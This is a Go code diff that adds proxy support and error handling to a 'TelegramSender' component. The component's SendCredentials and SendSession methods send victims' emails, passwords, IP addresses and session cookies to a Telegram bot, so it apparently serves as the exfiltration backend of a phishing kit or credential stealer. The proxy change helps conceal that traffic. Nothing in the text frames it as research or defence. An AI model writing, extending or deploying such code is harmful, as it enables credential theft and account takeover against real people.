@@ -7,16 +7,41 @@ import (
 	"html"
 	"mime/multipart"
 	"net/http"
+	"net/url"
+	"strings"
 	"time"
 )
 
 type TelegramSender struct {
-	Token  string
-	ChatID string
+	Token    string
+	ChatID   string
+	ProxyURL string
+	client   *http.Client
 }
 
-func NewSender(token, chatID string) *TelegramSender {
-	return &TelegramSender{Token: token, ChatID: chatID}
+func NewSender(token, chatID, proxyURL string) *TelegramSender {
+	httpClient := &http.Client{
+		Timeout: 15 * time.Second,
+	}
+
+	proxyURL = strings.TrimSpace(proxyURL)
+	if proxyURL != "" {
+		if p, err := url.Parse(proxyURL); err == nil {
+			if defaultTransport, ok := http.DefaultTransport.(*http.Transport); ok {
+				// Clone DefaultTransport to keep optimization settings (pooling, keep-alives)
+				transport := defaultTransport.Clone()
+				transport.Proxy = http.ProxyURL(p)
+				httpClient.Transport = transport
+			}
+		}
+	}
+
+	return &TelegramSender{
+		Token:    token,
+		ChatID:   chatID,
+		ProxyURL: proxyURL,
+		client:   httpClient,
+	}
 }
 
 func (t *TelegramSender) SendCredentials(source, email, password, ip string) error {
@@ -66,14 +91,17 @@ func (t *TelegramSender) SendSession(source, email, cookies string) error {
 }
 
 func (t *TelegramSender) send(msg string) error {
-	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", t.Token)
-	data, _ := json.Marshal(map[string]string{
+	apiURL := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", t.Token)
+	data, err := json.Marshal(map[string]string{
 		"chat_id": t.ChatID,
 		"text":    msg,
 		"parse_mode": "HTML",
 	})
+	if err != nil {
+		return fmt.Errorf("failed to marshal telegram message: %w", err)
+	}
 	
-	resp, err := http.Post(url, "application/json", bytes.NewBuffer(data))
+	resp, err := t.client.Post(apiURL, "application/json", bytes.NewBuffer(data))
 	if err != nil {
 		return err
 	}
@@ -87,7 +115,7 @@ func (t *TelegramSender) send(msg string) error {
 }
 
 func (t *TelegramSender) sendFile(filename, content string) error {
-	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendDocument", t.Token)
+	apiURL := fmt.Sprintf("https://api.telegram.org/bot%s/sendDocument", t.Token)
 	
 	body := &bytes.Buffer{}
 	writer := multipart.NewWriter(body)
@@ -113,7 +141,7 @@ func (t *TelegramSender) sendFile(filename, content string) error {
 		return err
 	}
 
-	resp, err := http.Post(url, writer.FormDataContentType(), body)
+	resp, err := t.client.Post(apiURL, writer.FormDataContentType(), body)
 	if err != nil {
 		return err
 	}
